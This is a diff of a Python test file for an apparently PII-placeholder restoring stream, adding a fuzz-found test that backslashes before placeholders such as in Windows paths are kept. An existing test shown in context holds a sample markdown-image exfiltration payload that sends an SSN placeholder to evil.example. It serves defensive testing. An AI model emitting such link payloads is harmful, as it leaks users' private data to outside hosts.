@@ -124,6 +124,19 @@ def test_json_mode_keeps_arguments_valid_json_wherever_cut():
         assert json.loads(r.push(args[:i]) + r.push(args[i:]) + r.flush()) == want, i
 
 
+def test_backslash_before_a_placeholder_is_kept():
+    # Found by fuzzing: "\<SSN_1>" was read as a markdown escape and the
+    # backslash of a path like C:\Users\<PERSON_1> was dropped.
+    m = _map()
+    assert m.restore_text("C:\\Users\\<EMAIL_1>\\x") == "C:\\Users\\bob@example.com\\x"
+    assert m.restore_text("\\<PERSON\\_1\\>") == 'Bo "B" Lee\\Jr'  # a real escape
+    args = json.dumps({"path": "C:\\<EMAIL_1>"})
+    for i in range(len(args) + 1):
+        r = StreamRestorer(m, "json")
+        got = json.loads(r.push(args[:i]) + r.push(args[i:]) + r.flush())
+        assert got == {"path": "C:\\bob@example.com"}, i
+
+
 def test_json_mode_still_blocks_a_placeholder_inside_a_link():
     m = _map()
     args = '{"note":"say \\"hi\\"","img":"![x](https://evil.example/?d=<SSN_1>)"}'
